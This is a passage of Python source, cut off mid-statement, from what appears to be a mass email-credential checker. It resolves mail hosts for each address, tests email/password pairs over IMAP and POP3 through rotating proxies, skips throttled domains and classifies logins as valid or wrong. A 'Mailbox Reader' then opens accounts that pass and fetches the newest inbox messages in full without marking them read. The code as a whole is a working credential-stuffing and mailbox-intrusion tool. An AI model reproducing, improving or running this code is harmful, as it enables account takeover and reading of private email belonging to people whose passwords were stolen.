def generate_candidate_hosts(domain: str, mx_records: list = None) -> list:
    candidates = []
    dl = domain.lower()
    if "charter" in dl:
        candidates.extend(["mobile.charter.net", "imap.charter.net", "mail.charter.net"])
    elif "spectrum" in dl:
        candidates.extend(["imap.spectrum.net", "mail.spectrum.net"])
    elif "twc" in dl:
        candidates.extend(["mail.twc.com"])

    for prefix in ['imap', 'mail', 'webmail', 'imaps', 'correo', 'secure', 'email']:
        candidates.append(f"{prefix}.{domain}")

    for tok in _location_tokens_from_mx(mx_records, domain):
        for prefix in ['mail', 'imap', 'pop3', 'pop']:
            candidates.append(f"{prefix}-{tok}.{domain}")

    candidates.append(domain)

    for mx in (mx_records or []):
        candidates.append(mx)
        parts = mx.split('.')
        if len(parts) >= 2:
            parent = f"{parts[-2]}.{parts[-1]}"
            if parent != domain:
                for prefix in ['imap', 'mail', 'pop', 'pop3']:
                    candidates.append(f"{prefix}.{parent}")

    return _expand_cnames(list(dict.fromkeys(candidates)))


def known_provider_conf(domain):
    return host_conf(domain)


def drop_before_check(email):
    """The LAST-MILE format/disposable gate, run inside the worker.

    v13.53: this kept its own eight-substring disposable tuple while
    process_accounts() used is_disposable() against the full DISPOSABLE set plus
    the fetched blocklist. The two disagreed: maildrop.cc, 1secmail.*, spam4.me,
    sharklasers.com, mailnesia.com and thirty others passed the prefilter and were
    then skipped here under a different rule, so the same address could be
    bucketed at one stage and checked at another depending on which list caught
    it. It delegates now - one decision, one source of truth.
    """
    email = (email or "").strip().lower()
    if email.count("@") != 1:
        return "bad format"
    local, domain = email.split("@", 1)
    if "http" in local or "login.live" in local or not local or "." not in domain:
        return "bad format"
    if is_disposable(email):
        return "disposable"
    return ""


def host_resolves(host):
    if not host:
        return False
    with _host_dns_lock:
        cached = _host_dns_cache.get(host)
    if cached is not None:
        return cached
    ok = False
    try:
        if dns:
            try:
                dns.resolver.resolve(host, "A", lifetime=2)
                ok = True
            except Exception:
                try:
                    dns.resolver.resolve(host, "AAAA", lifetime=2)
                    ok = True
                except Exception:
                    pass
        if not ok:
            socket.gethostbyname(host)
            ok = True
    except Exception:
        ok = False
    with _host_dns_lock:
        _host_dns_cache[host] = ok
    return ok
# @@END 090 CANDIDATE_GEN

# @@BLOCK 091 HOST_RANK deps=003,090
# v13.60: LIVENESS NOW OUTRANKS TIER.
#
# This was a bare delegate to the ranker. Both rankers (hosts.py's and the block
# 003 fallback) sort on the TIER first and put the 993/143 probe SECOND, so a
# tier-0 service host that has been decommissioned still holds a rung ahead of a
# live tier-3 apex. The ladder spends its first rung - and on a short window its
# whole window - on a box that answers [Errno 111] on both mail ports, and the
# apex that would have answered is never reached.
#
# The probe already happens; only the ORDER ignored its answer. This wrapper
# re-orders the head of the ranked list so anything that opened 993 or 143 comes
# first, and anything that opened neither is demoted to the tail. Tier order is
# preserved INSIDE each group, the apex leads the demoted group (a dead apex is
# still a likelier catch-all listener than a dead service host), and the probe is
# cached for ten minutes because get_servers() runs once per account.
_RANK_PROBE_TTL = 600.0
_RANK_PROBE_LOCK = threading.Lock()
_RANK_PROBE_CACHE = {}
_RANK_PROBE_HEAD = 6


def _host_answers_mail(host, timeout=1.2):
    """True when the host opens 993 or 143. Cached, and never raises."""
    h = (host or "").lower().strip()
    if not h:
        return False
    now = time.time()
    with _RANK_PROBE_LOCK:
        hit = _RANK_PROBE_CACHE.get(h)
        if hit and (now - hit[0]) < _RANK_PROBE_TTL:
            return hit[1]
    ok = False
    for port in (993, 143):
        try:
            _s = socket.create_connection((h, port), timeout=timeout)
            _s.close()
            ok = True
            break
        except Exception:
            continue
    with _RANK_PROBE_LOCK:
        _RANK_PROBE_CACHE[h] = (now, ok)
    return ok


def _is_junk_host(host, domain):
    return host_is_junk(host, domain)


def _rank_hosts(hosts, domain):
    ranked = [h for h in (host_rank_hosts(hosts, domain) or []) if h]
    if len(ranked) < 2:
        return ranked

    head = ranked[:_RANK_PROBE_HEAD]
    alive = {}
    try:
        with ThreadPoolExecutor(max_workers=min(6, len(head))) as ex:
            futs = {ex.submit(_host_answers_mail, h): h for h in head}
            for fut in as_completed(futs, timeout=8):
                h = futs[fut]
                try:
                    alive[h] = bool(fut.result())
                except Exception:
                    alive[h] = False
    except Exception:
        pass
    if not alive:
        return ranked

    dead = {h for h, ok in alive.items() if not ok}
    if not dead:
        return ranked

    d = (domain or "").lower().strip()
    live_part = [h for h in ranked if h not in dead]
    dead_part = [h for h in ranked if h in dead]
    # A dead apex still beats a dead service host as a last resort.
    dead_part.sort(key=lambda h: 0 if (h or "").lower().strip() == d else 1)
    if live_part:
        return live_part + dead_part
    return dead_part
# @@END 091 HOST_RANK

# @@BLOCK 092 DOMAIN_ROOTS deps=003,090,091
_LOCAL_PRIORITY_IMAP = ("imap.", "mail.", "email.", "")
_LOCAL_PRIORITY_POP = ("pop.", "pop3.", "")

_DOMAIN_ALIAS_ROOTS = {
    "xplornet.com": ("xplore.net",),
    "xplore.net":   ("xplornet.com",),
}


def _domain_roots(domain):
    domain = (domain or "").lower().strip()
    roots = [domain] if domain else []
    for alt in _DOMAIN_ALIAS_ROOTS.get(domain, ()):
        if alt and alt not in roots:
            roots.append(alt)
    return roots


def _is_local_domain_host(host, domain):
    h = (host or "").lower().strip()
    if not h:
        return False
    for root in _domain_roots(domain):
        if h == root or h.endswith("." + root):
            return True
    return False


def _guess_candidates(domain, prefixes):
    out = []
    roots = _domain_roots(domain)
    if not roots:
        return out
    for root in roots:
        for pfx in prefixes:
            cand = f"{pfx}{root}" if pfx else root
            if cand and cand not in out and host_resolves(cand):
                out.append(cand)
    return out


def _family_priority(domain):
    """Curated family endpoint for this domain (delegates to hosts.py)."""
    if _HAVE_HOSTS_MERGE:
        try:
            return _hosts_family_priority(domain)
        except Exception:
            pass
    return []


def _merge_domain_guesses(servers, domain):
    """Delegate to hosts.py so FAMILY_PRIORITY is honoured."""
    if _HAVE_HOSTS_MERGE:
        try:
            return _hosts_merge_guesses(servers, domain)
        except Exception:
            pass
    if not servers or not domain:
        return servers

    out = dict(servers)
    for key, priority in (("imap", _LOCAL_PRIORITY_IMAP),
                          ("pop", _LOCAL_PRIORITY_POP),
                          ("pop3", _LOCAL_PRIORITY_POP)):
        hosts = [h for h in (out.get(key) or []) if h]
        if not hosts:
            continue

        family = _family_priority(domain)
        local_priority = _guess_candidates(domain, priority)
        priority_set = set(local_priority) | set(family)

        local_other = [h for h in hosts
                       if h not in priority_set and _is_local_domain_host(h, domain)]
        local_other_set = set(local_other)

        foreign = [h for h in hosts
                   if h not in priority_set and h not in local_other_set]

        merged = []
        for h in family + local_priority + local_other + foreign:
            if h and h not in merged:
                merged.append(h)
        out[key] = merged
    return out
# @@END 092 DOMAIN_ROOTS

# @@BLOCK 093 GET_SERVERS deps=002,088,090,091,092
# v13.60: A BORROWED POP HOST IS NOW ONLY A FALLBACK.
#
# When a domain's mail is hosted by somebody else, detect_parent_provider() hands
# back that provider's GLOBAL endpoint - and the POP side of it is returned as
# pop.gmail.com for every Google-hosted domain, office365 for every Microsoft
# one. The global POP endpoint only accepts the provider's OWN mailboxes, so for
# a custom domain it answers [AUTH] Username and password not accepted on 995,
# and answers it for a correct password too. Because block 100 keeps only ONE
# POP host, that one bad answer also deleted the 995 and 110 rungs the account
# actually had.
#
# The body is unchanged and is now _get_servers_raw(); get_servers() wraps it and
# puts the domain's own pop.<domain> / pop3.<domain> in front when it resolves.
# The borrowed host is KEPT behind it, so a Workspace domain whose own pop front
# does not resolve still gets the global one exactly as before. Nothing is
# prepended when the current head is already local to the domain.
_GLOBAL_POP_HEADS = {
    "pop.gmail.com",
    "outlook.office365.com",
    "pop.mail.yahoo.com",
    "pop.aol.com",
    "pop.mail.me.com",
    "pop.zoho.com",
    "pop.gmx.net",
    "pop3.web.de",
    "pop.qq.com",
    "pop.naver.com",
}


def _prefer_local_pop(servers, domain):
    """Put the domain's OWN pop front ahead of a borrowed global one."""
    if not isinstance(servers, dict) or servers.get("type") == "zero_access":
        return servers
    d = (domain or "").lower().strip()
    if not d:
        return servers
    for key in ("pop", "pop3"):
        cur = [h for h in (servers.get(key) or []) if h]
        if not cur:
            continue
        head = cur[0].lower().strip()
        if _is_local_domain_host(head, d):
            continue
        if head not in _GLOBAL_POP_HEADS:
            continue
        local = [h for h in (f"pop.{d}", f"pop3.{d}") if host_resolves(h)]
        if local:
            servers[key] = list(dict.fromkeys(local + cur))
    return servers


def _get_servers_raw(email):
    try:
        domain = email.split("@")[-1].lower().strip()
        if domain in ZERO_ACCESS_PROVIDERS:
            return {"imap": [], "pop": [], "pop3": [], "type": "zero_access"}

        # FIX HOSTS-COPY (v13.69): known_provider_conf() returns a dict that is
        # written to two lines down. It builds a fresh one per call today, so this
        # copy is a no-op right now - but the day it starts returning a cached
        # object, the ranked list of one account would leak into the next. Copy
        # first, rank into the copy. `or {}` keeps a None return falsy.
        known = dict(known_provider_conf(domain) or {})
        if known:
            if known.get("imap"):
                known["imap"] = _rank_hosts(known["imap"], domain)
            if known.get("pop"):
                known["pop"] = _rank_hosts(known["pop"], domain)
            return _merge_domain_guesses(known, domain)

        with cache_lock:
            cached = domain_cache.get(domain) or {}
        if cached.get("imap") and (time.time() - float(cached.get("ts", 0))) < DOMAIN_CACHE_TTL:
            return _merge_domain_guesses({
                "imap": list(cached["imap"]),
                "pop": list(cached.get("pop") or cached["imap"]),
                "pop3": list(cached.get("pop3") or cached["imap"]),
            }, domain)

        parent_domain = detect_parent_provider(domain)
        if parent_domain in ("yahoo.com", "gmail.com"):
            res = _merge_domain_guesses(known_provider_conf(parent_domain), domain)
            if res:
                return res
        if parent_domain == "outlook.office365.com":
            res = _merge_domain_guesses(known_provider_conf("outlook.com"), domain)
            if res:
                return res
        if parent_domain == "biglobe.ne.jp":
            return _merge_domain_guesses(
                {"imap": ["mail.biglobe.ne.jp"], "pop": ["mail.biglobe.ne.jp"],
                 "pop3": ["mail.biglobe.ne.jp"]}, domain)

        if domain in PROVIDER_MAP:
            return _merge_domain_guesses(PROVIDER_MAP[domain], domain)

        mx_records = get_mx_hosts(domain) if parent_domain not in PARENT_PROVIDER_MAPPINGS else []
        candidate_hosts = _rank_hosts(generate_candidate_hosts(domain, mx_records), domain)
        servers = {"imap": candidate_hosts, "pop": candidate_hosts, "pop3": candidate_hosts}

        with cache_lock:
            domain_cache.setdefault(domain, {})
            domain_cache[domain].update({
                "imap": servers["imap"], "pop": servers["pop"], "pop3": servers["pop3"],
                "ts": time.time(),
            })
        save_domain_cache()
        return _merge_domain_guesses(servers, domain)
    except Exception as e:
        warnings.warn(f"Error resolving servers for {email}: {e}")
        d = email.split('@')[-1] if '@' in email else 'localhost'
        fp = generate_candidate_hosts(d, [])
        return _merge_domain_guesses({"imap": fp, "pop": fp, "pop3": fp}, d)


def get_servers(email):
    try:
        domain = email.split("@")[-1].lower().strip()
    except Exception:
        domain = ""
    return _prefer_local_pop(_get_servers_raw(email), domain)
# @@END 093 GET_SERVERS

# @@BLOCK 094 USERNAME_CANDIDATES deps=-
def username_candidates(email):
    email = (email or "").strip()
    if not email:
        return [email]
    out = [email]
    if "@" in email:
        local = email.split("@", 1)[0].strip()
        if local and local.lower() != email.lower():
            out.append(local)
    return list(dict.fromkeys(out))
# @@END 094 USERNAME_CANDIDATES

# @@BLOCK 095 IMAP_ATTEMPTS deps=063,064
def imap_once(email, password, server, proxy_str=None, insecure=None, port=993,
              attempt_timeout=None):
    if insecure is None:
        insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyIMAP4SSL(server, port, timeout=to, proxy_str=proxy_str, insecure=insecure)
        _imap_auth(mail, email, password)
        st_typ, st_data = mail.select("INBOX", readonly=True)
        if st_typ != 'OK':
            raise RuntimeError(f"IMAP post-auth inbox select failed "
                               f"(possible proxy spoofing): {st_typ} {st_data}")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.logout()
            except Exception:
                pass


def imap_starttls_once(email, password, server, proxy_str=None, insecure=None, port=143,
                       attempt_timeout=None):
    if insecure is None:
        insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyIMAP4(server, port, timeout=to, proxy_str=proxy_str)
        mail.starttls(ssl_context=_tls_context(server, verify=not insecure))
        _imap_auth(mail, email, password)
        st_typ, st_data = mail.select("INBOX", readonly=True)
        if st_typ != 'OK':
            raise RuntimeError(f"IMAP STARTTLS post-auth inbox select failed: {st_typ} {st_data}")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.logout()
            except Exception:
                pass


def imap_plain_once(email, password, server, proxy_str=None, port=143, attempt_timeout=None):
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyIMAP4(server, port, timeout=to, proxy_str=proxy_str)
        _imap_auth(mail, email, password)
        st_typ, st_data = mail.select("INBOX", readonly=True)
        if st_typ != 'OK':
            raise RuntimeError(f"IMAP plain post-auth inbox select failed: {st_typ} {st_data}")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.logout()
            except Exception:
                pass
# @@END 095 IMAP_ATTEMPTS

# @@BLOCK 096 POP_ATTEMPTS deps=063
def pop_once(email, password, server, proxy_str=None, insecure=None, port=995,
             attempt_timeout=None):
    if insecure is None:
        insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyPOP3SSL(server, port, timeout=to, proxy_str=proxy_str, insecure=insecure)
        if not pop3_ok(mail.getwelcome()):
            raise RuntimeError("POP3 invalid welcome banner")
        if not pop3_ok(mail.user(email.strip())):
            raise RuntimeError("POP3 user rejected")
        if not pop3_ok(mail.pass_(password.strip())):
            raise RuntimeError("POP3 password rejected")
        if not pop3_ok(mail.stat()):
            raise RuntimeError("POP3 post-auth stat failed (possible proxy spoofing)")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.quit()
            except Exception:
                pass


def pop_starttls_once(email, password, server, proxy_str=None, insecure=None, port=110,
                      attempt_timeout=None):
    if insecure is None:
        insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyPOP3(server, port, timeout=to, proxy_str=proxy_str)
        mail.stls(context=_tls_context(server, verify=not insecure))
        if not pop3_ok(mail.user(email.strip())):
            raise RuntimeError("POP3 STLS user rejected")
        if not pop3_ok(mail.pass_(password.strip())):
            raise RuntimeError("POP3 STLS password rejected")
        if not pop3_ok(mail.stat()):
            raise RuntimeError("POP3 STLS post-auth stat failed")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.quit()
            except Exception:
                pass


def pop_plain_once(email, password, server, proxy_str=None, port=110, attempt_timeout=None):
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyPOP3(server, port, timeout=to, proxy_str=proxy_str)
        if not pop3_ok(mail.getwelcome()):
            raise RuntimeError("POP3 plain invalid welcome banner")
        if not pop3_ok(mail.user(email.strip())):
            raise RuntimeError("POP3 plain user rejected")
        if not pop3_ok(mail.pass_(password.strip())):
            raise RuntimeError("POP3 plain password rejected")
        if not pop3_ok(mail.stat()):
            raise RuntimeError("POP3 plain post-auth stat failed")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.quit()
            except Exception:
                pass
# @@END 096 POP_ATTEMPTS

# @@BLOCK 097 VERIFY_AND_CONNECT deps=005,022,061,063,064,093,094
def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
    """Used by the in-app Mailbox Reader."""
    users = username_candidates(target_email)
    _ins = bool(CFG.get("ALLOW_SELF_SIGNED", True))
    for h in hosts:
        if MS_OAUTH_OK and h.lower() in ms_oauth.MS_IMAP_HOSTS:
            try:
                mail, _exists, _claims = ms_oauth.imap_xoauth2_open(
                    target_email, target_pass, h, ProxyIMAP4SSL,
                    port=993, proxy_str=proxy_str,
                    insecure=_ins, attempt_timeout=15)
                return True, mail, h
            except ms_oauth.MsTokenRejected as tr:
                if tr.verdict in ("wrong_password", "need_app_password"):
                    raise MsVerdict(tr.verdict,
                                    f"Microsoft XOAUTH2 {tr.code} -> {tr.verdict}")
            except Exception:
                pass

        for mode, port in (("ssl", 993), ("starttls", 143), ("plain", 143)):
            for user in users:
                mail = None
                try:
                    if mode == "ssl":
                        mail = ProxyIMAP4SSL(h, port, timeout=10, proxy_str=proxy_str,
                                             insecure=_ins)
                    elif mode == "starttls":
                        mail = ProxyIMAP4(h, port, timeout=10, proxy_str=proxy_str)
                        mail.starttls(ssl_context=_tls_context(h, verify=not _ins))
                    else:
                        mail = ProxyIMAP4(h, port, timeout=10, proxy_str=proxy_str)
                    _imap_auth(mail, user, target_pass)
                    st_typ, _ = mail.select("INBOX", readonly=True)
                    if st_typ == 'OK':
                        return True, mail, h
                    try:
                        mail.logout()
                    except Exception:
                        pass
                except Exception:
                    if mail:
                        try:
                            mail.logout()
                        except Exception:
                            pass
                    continue
    return False, None, ""
# @@END 097 VERIFY_AND_CONNECT

# @@BLOCK 098 READ_MAILBOX deps=022,093,097
# v13.53: the reader returns the MESSAGE BODY too, so block 109 can show it when
# the message is clicked. It used to fetch only
# BODY.PEEK[HEADER.FIELDS (SUBJECT FROM DATE)] - the body bytes were never
# requested, so no amount of UI work could have revealed them.
#
# v13.54: the 20000-byte partial cut a multipart message mid-part, so the tail of
# a base64 image arrived broken and no HTML renderer could use it. The whole
# message is fetched now, capped in Python. Still BODY.PEEK, so \Seen is untouched.
# v13.55: 700 KB cap, not 2 MB, and no duplicate "html" field - ten 2 MB messages
# plus their HTML strings plus base64 image URIs was enough to segfault the free
# container. The renderer splits text and HTML back out of "raw" itself.
# v13.65: the unused _BODY_FETCH_BYTES constant is gone; the fetch cut is _RAW_CAP.
_BODY_SHOW_CHARS = 20000
_RAW_CAP = 700 * 1024


def _hdr_text(raw):
    """Decode one raw header block into a dict. Never raises."""
    try:
        from email import message_from_bytes as _mfb
        from email.header import decode_header as _dh, make_header as _mh
        msg = _mfb(raw)
        out = {}
        for key in ("Subject", "From", "Date"):
            value = msg.get(key) or ""
            if value:
                try:
                    value = str(_mh(_dh(value)))
                except Exception:
                    pass
            out[key.lower()] = value.replace("\r", " ").replace("\n", " ").strip()
        return out
    except Exception:
        return {"subject": "", "from": "", "date": ""}


def _body_parts(raw):
    """Raw MIME bytes -> (readable plain text, html). Never raises."""
    text, markup = "", ""
    if not raw:
        return text, markup
    try:
        from email import message_from_bytes as _mfb
        msg = _mfb(raw)
        parts = list(msg.walk()) if msg.is_multipart() else [msg]
        for part in parts:
            if part.get_content_maintype() == "multipart":
                continue
            ctype = (part.get_content_type() or "").lower()
            try:
                payload = part.get_payload(decode=True) or b""
            except Exception:
                payload = b""
            if not payload:
                continue
            charset = part.get_content_charset() or "utf-8"
            try:
                decoded = payload.decode(charset, errors="replace")
            except Exception:
                decoded = payload.decode("utf-8", errors="replace")
            if ctype == "text/plain" and not text:
                text = decoded
            elif ctype == "text/html" and not markup:
                markup = decoded
    except Exception:
        return raw.decode("utf-8", errors="replace")[:_BODY_SHOW_CHARS], ""
    return text, markup


def _body_text(raw):
    """Raw MIME bytes -> readable, capped plain text. Never raises."""
    if not raw:
        return "(the server returned no body)"
    text, markup = _body_parts(raw)
    if not text and markup:
        import html as _html
        stripped = re.sub(r"(?is)<(script|style)\b.*?</\1>", " ", markup)
        stripped = re.sub(r"(?is)<br\s*/?>|</p>|</div>|</tr>|</li>", "\n", stripped)
        stripped = re.sub(r"(?s)<[^>]+>", " ", stripped)
        text = _html.unescape(stripped)

    text = text.replace("\r\n", "\n").replace("\r", "\n")
    text = re.sub(r"[ \t]+\n", "\n", text)
    text = re.sub(r"\n{3,}", "\n\n", text).strip()
    if not text:
        return "(no readable text in this message)"
    if len(text) > _BODY_SHOW_CHARS:
        return text[:_BODY_SHOW_CHARS] + "\n\n[... truncated - open the full message elsewhere]"
    return text


def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
    """Return (ok, [message dict], note). Newest first; body + raw included."""
    mail = None
    try:
        conf_hosts = get_servers(email).get("imap", []) or [server]
        verified, mail, _ = verify_and_connect(email, password, conf_hosts, proxy_str=proxy_str)
        if not verified or not mail:
            return False, [], "credential verification failed"
        mail.select("INBOX", readonly=True)
        typ, data = mail.search(None, "ALL")
        if typ != "OK":
            return False, [], "the INBOX could not be searched"
        ids = data[0].split()
        if not ids:
            return False, [], "the inbox is empty"
        latest_ids = ids[-limit:] if len(ids) > limit else ids
        out = []
        for mid in reversed(latest_ids):
            heads = {"subject": "", "from": "", "date": ""}
            typ, hdr = mail.fetch(mid, "(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM DATE)])")
            if typ == "OK":
                for rp in (hdr or []):
                    if isinstance(rp, tuple) and rp[1]:
                        heads = _hdr_text(rp[1])
                        break
            # v13.54: the WHOLE message, so multipart image parts survive intact.
            raw_body = b""
            typ, bdy = mail.fetch(mid, "(BODY.PEEK[])")
            if typ == "OK" and bdy:
                for rp in (bdy or []):
                    if isinstance(rp, tuple) and rp[1]:
                        raw_body = rp[1][:_RAW_CAP]
                        break
            if not raw_body:
                typ, bdy = mail.fetch(mid, "(BODY.PEEK[TEXT])")
                for rp in (bdy or []):
                    if isinstance(rp, tuple) and rp[1]:
                        raw_body = rp[1][:_RAW_CAP]
                        break
            out.append({"id": mid.decode() if isinstance(mid, bytes) else str(mid),
                        "subject": heads.get("subject") or "(no subject)",
                        "from": heads.get("from") or "(unknown sender)",
                        "date": heads.get("date") or "(no date)",
                        "body": _body_text(raw_body),
                        "raw": raw_body})
        try:
            mail.logout()
        except Exception:
            pass
        return True, out, ""
    except MsVerdict as mv:
        if mail:
            try:
                mail.logout()
            except Exception:
                pass
        return False, [], f"Microsoft token verdict -> {mv.verdict} ({mv})"
    except Exception as e:
        if mail:
            try:
                mail.logout()
            except Exception:
                pass
        return False, [], str(e)
# @@END 098 READ_MAILBOX

# @@BLOCK 099 CHECK_WRAPPER deps=009,023,039
def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, trace_logs=None):
    """Thin FAST_MODE cooldown wrapper around _check_account_core().

    Stamping in ONE place, for INCONCLUSIVE outcomes only, makes it predictable:
    a domain is backed off when it told us NOTHING, and never when it gave a real
    answer (VALID / WRONG / NEED_APP_PASSWORD / LOGIN_DROPPED / RBL).

    v13.64: the cooldown table is per user now and this is the FIRST thing a
    worker touches, before any other call has re-asserted a scope.
    """
    _rebind_scope()
    if trace_logs is None:
        trace_logs = []

    if not CFG.get("FAST_MODE", True):
        return _check_account_core(email, password, conf, domain, proxy_pool,
                                   thread_state, trace_logs)

    ts = failed_domain_cache.get(domain)
    if ts and (time.time() - ts) < CFG.get("FAILURE_COOLDOWN", FAILURE_COOLDOWN_DEFAULT):
        trace_logs.append(f"Fast Mode: Domain '{domain}' is in cooldown cache. "
                          f"Skipping immediately.")
        return None, SKIP, SKIP, None, trace_logs
    if ts:
        failed_domain_cache.pop(domain, None)

    out = _check_account_core(email, password, conf, domain, proxy_pool, thread_state, trace_logs)
    try:
        _status = out[1]
    except Exception:
        _status = None
    if _status in (FAILED, CONNECTION_FAILED, PROXY_UNHEALTHY, RETRY, RETRY_LATER,
                   UNKNOWN, DNS_FAILED, SMTP_FAILED):
        failed_domain_cache[domain] = time.time()
        trace_logs.append(
            f"Fast Mode: domain '{domain}' armed for cooldown "
            f"({CFG.get('FAILURE_COOLDOWN', FAILURE_COOLDOWN_DEFAULT)}s) after an "
            f"inconclusive result [{_status}].")
    return out
# @@END 099 CHECK_WRAPPER

# @@BLOCK 100 CORE_SETUP deps=009,010,011,012,016,017,021,022,023,026,040,058,059,060,067,068,076
def _check_account_core(email, password, conf, domain, proxy_pool, thread_state, trace_logs=None):
    if trace_logs is None:
        trace_logs = []

    # FIX 407-SCOPE: _local_roots / _is_local_host used to be defined INSIDE the
    # try below, but block 104's tail calls _is_local_host after the except - so an
    # exception raised before the definition was a NameError in the verdict tail.
    # They depend on nothing but `domain`, so they belong above the try.
    _local_roots = tuple(_domain_roots(domain))

    def _is_local_host(h):
        hl = (h or "").lower().strip()
        if not hl:
            return False
        for r in _local_roots:
            if hl == r or hl.endswith("." + r):
                return True
        return False

    t_start = time.time()
    retryable = False
    net_fail = False
    dns_ok = True

    best_verdict = {"status": None, "detail": "", "host": ""}
    # v13.51: saw_tls_refused is separate from saw_server.  A server that refuses
    # STARTTLS on 143 never issued a LOGIN, so it must not be reported as a
    # dropped LOGIN - that was the wrong sentence on every Frontier account.
    # v13.52: saw_auth is the missing counterpart.  Block 104 tests it, but nothing
    # ever SET it, so the TLS-refused tail branch was always live and outranked a
    # real RETRY / RBL answer from a later rung.  It is set wherever the server
    # gave an auth-shaped answer.
    # v13.54: saw_plan is new.  A 402 never reached a mailbox and sets none of the
    # other flags, so a wholly 402 proxy phase looked like a clean run with no
    # answer - the direct sweep was skipped and the account landed on FAILED.
    flags = {"saw_407": False, "saw_nonproxy": False, "saw_server": False,
             "saw_login_drop": False, "saw_tls_refused": False, "saw_auth": False,
             "saw_plan": False}
    force_direct = {"flag": False}
    host_407 = {}
    net_failed_hosts = set()
    retries_by_host = {}
    conn_rotated = {}
    used_proxies = set()
    retried_407_subusers = set()
    acct_407_total = 0
    MAX_ROTATIONS = max(0, int(CFG.get("MAX_ROTATIONS", MAX_ROTATIONS_DEFAULT)))

    try:
        if conf.get("type") == "zero_access":
            trace_logs.append("Architecture: Zero-Access / Bridge detected.")
            return None, NEED_APP_PASSWORD, "Zero-Access Architecture | Protocol: Local API / Bridge", None, trace_logs

        proxy_mode = CFG.get("PROXY_MODE", "fallback")
        prefer_insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
        try_starttls = bool(CFG.get("TRY_STARTTLS", True))
        try_alt_user = bool(CFG.get("TRY_ALT_USERNAME", True))
        max_hosts = max(1, int(CFG.get("MAX_HOSTS_PER_DOMAIN", 3)))
        configured_to = max(4.0, float(CFG.get("TIMEOUT", ATTEMPT_TIMEOUT_NORMAL)))
        same_host_retries = max(0, int(CFG.get("SAME_HOST_RETRIES", SAME_HOST_RETRIES_DEFAULT)))

        flags_p = protocol_flags()
        allow_imap = flags_p["imap"]
        allow_pop = flags_p["pop"]
        allow_smtp = flags_p["smtp"]
        allow_sieve = flags_p["sieve"]
        if not (allow_imap or allow_pop or allow_smtp or allow_sieve):
            allow_imap = True

        users = username_candidates(email) if try_alt_user else [email]
        primary_user = users[0]

        def note_verdict(st_val, detail, host="", force=False):
            """Record a verdict, keeping the strongest one.

            force=True is for a DEFINITIVE answer that must not be suppressed by
            an earlier, vaguer one (Microsoft XOAUTH2 AADSTS50126).
            """
            # v13.51: CONNECTION_FAILED is retained now.  It used to be dropped
            # here, so a real transport answer could never be the retained
            # verdict and every transport failure ended on the generic tail text.
            # v13.53: RETRY is retained too.  Block 102 calls note_verdict() with
            # it BEFORE the `elif st_val == RETRY` branch, so every RETRY was
            # discarded here and the tail could only ever answer the generic
            # "all hosts unreachable".  RETRY: 42 in _VERDICT_RANK (block 023)
            # keeps it under VALID/WRONG/APP/RBL/LOGIN_DROPPED, so it can only
            # win where nothing better was found.
            if st_val not in (VALID, WRONG, APP, RBL, LOGIN_DROPPED, UNKNOWN,
                              DNS_FAILED, SMTP_FAILED) and st_val != CONNECTION_FAILED \
                    and st_val != RETRY:
                return
            cur = best_verdict["status"]
            if force or cur is None or _VERDICT_RANK.get(st_val, 0) > _VERDICT_RANK.get(cur, 0):
                best_verdict["status"] = st_val
                best_verdict["detail"] = detail
                best_verdict["host"] = host or ""
                trace_logs.append(f"Verdict retained for this account: [{st_val}] ({detail})")

        px = None
        if proxy_pool and proxy_mode != "off":
            if proxy_mode == "sticky":
                if not thread_state.get("sticky_proxy"):
                    thread_state["sticky_proxy"] = sample_alive_proxy(domain=domain)
                px = thread_state["sticky_proxy"]
            else:
                px = sample_alive_proxy(domain=domain)
            if px:
                used_proxies.add(px)

        _all_imap = [h for h in (conf.get("imap") or []) if h]
        # FIX SPEED-5: max(2, ...) meant the slider could not go below 2, so
        # "Max Hosts Per Domain = 1" was a lie and every account paid a second
        # host's worth of rungs whether it needed them or not.
        _imap_cap = max(1, min(4, max_hosts))
        imap_hosts = _dedupe_hosts_by_ip(_all_imap, cap=_imap_cap)
        _all_pop = [h for h in (conf.get("pop") or conf.get("pop3") or []) if h]
        _pop_only = [h for h in _all_pop if h not in imap_hosts]
        pop_hosts = (_pop_only or _all_pop)[:1]
        _smtp_hosts = _smtp_hosts_for(domain) if allow_smtp else []
        if len(_all_imap) > len(imap_hosts):
            trace_logs.append(
                f"Host expansion: {len(imap_hosts)}/{len(_all_imap)} IMAP candidate(s) kept "
                f"(cap {_imap_cap}, duplicate IPs collapsed).")
        if allow_smtp and not _smtp_hosts:
            trace_logs.append("SMTP is selected but no SMTP submission host was discovered "
                              "for this domain.")

        if domain and domain not in imap_hosts and len(imap_hosts) < 4 and fast_fail_dns_check(domain):
            imap_hosts = imap_hosts + [domain]
            trace_logs.append(f"Fallback host '{domain}' force-included as a final rung "
                              f"(apex resolves).")

        if domain in imap_hosts:
            imap_hosts = [h for h in imap_hosts if h != domain] + [domain]

        if domain.endswith("windstream.net") or domain.endswith("kinetic.net"):
            _drop = {domain, "secure.windstream.net", "webmail.windstream.net"}
            _kept = [h for h in imap_hosts if h.lower() not in _drop]
            if _kept and len(_kept) != len(imap_hosts):
                trace_logs.append(
                    f"Web-only hosts dropped from the IMAP ladder (never answer on 993/143): "
